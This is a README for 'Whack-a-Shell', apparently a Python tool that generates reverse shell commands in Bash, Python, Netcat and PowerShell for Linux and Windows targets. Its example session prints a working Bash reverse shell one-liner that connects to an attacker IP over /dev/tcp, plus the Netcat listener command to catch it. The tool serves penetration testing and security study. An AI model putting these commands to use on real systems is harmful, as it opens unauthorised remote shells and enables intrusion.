
## Reverse Shell Generator

A Python tool for dynamically generating reverse shell commands for both Windows and Linux systems. This tool supports multiple shell types and provides easy-to-use prompts with built-in IP address and port validation.

## Features

- Cross-platform support**: Generates reverse shell commands for both Windows and Linux systems.
- Multiple reverse shell types**: Includes Bash, Python, Netcat for Linux, and PowerShell, Netcat for Windows.
- User-friendly interface**: Simple prompts for user input and shell selection.
- Error handling**: Validates IP address and port input, handling incorrect entries gracefully.

## Requirements

- **Python 3.x**
- `colorama` library for colored terminal output
- `ipaddress` library for IP validation (built into Python 3)
- Your custom `reverse_shells.py` file that contains `LinuxReverseShellGenerator` and `WindowsReverseShellGenerator`.

### Install dependencies

Run the following command to install `colorama`:

```bash
pip install colorama
```

## How to Run

1. Clone or download this repository to your local machine.
2. Ensure the `reverse_shells.py` file is in the same directory as the main script.
3. Run the Python script:

```bash
python3 Whack-a-Shell.py
```

## Usage

1. Select the target operating system (Windows or Linux) when prompted.
2. Enter a valid IP address and port number.
3. Choose from the available reverse shell types based on your OS selection.
4. The generated reverse shell command will be displayed, along with the command to set up a Netcat listener on the attack machine.

## Example

```
Please select the OS for the reverse shell:
Enter 1 for Windows
Enter 2 for Linux
Choice: 2

You have selected Linux for the reverse shell.

Enter the IP address: 192.168.1.10
Enter the port number: 4444

Please choose the shell program

Enter 1 for Bash Reverse Shell
Enter 2 for Python Reverse Shell
Enter 3 for Netcat Reverse Shell
Choice: 1

Here is your reverse shell: sh -i >& /dev/tcp/192.168.1.10/4444 0>&1

Run this command on the attack machine to set up a listener: nc -nvlp 4444
```

## Error Handling

- **Invalid IP Address**: The program will prompt for a valid IP address if the input is not a valid IPv4 format.
- **Invalid Port**: The port number must be between 1 and 65535. If the input is outside this range or is not a number, the program will prompt for a valid port.

## Customization

You can easily extend this tool by adding more reverse shell options to the `LinuxReverseShellGenerator` and `WindowsReverseShellGenerator` classes in the `reverse_shells.py` file.

## License
This project is licensed under the MIT License. See the LICENSE file for details.

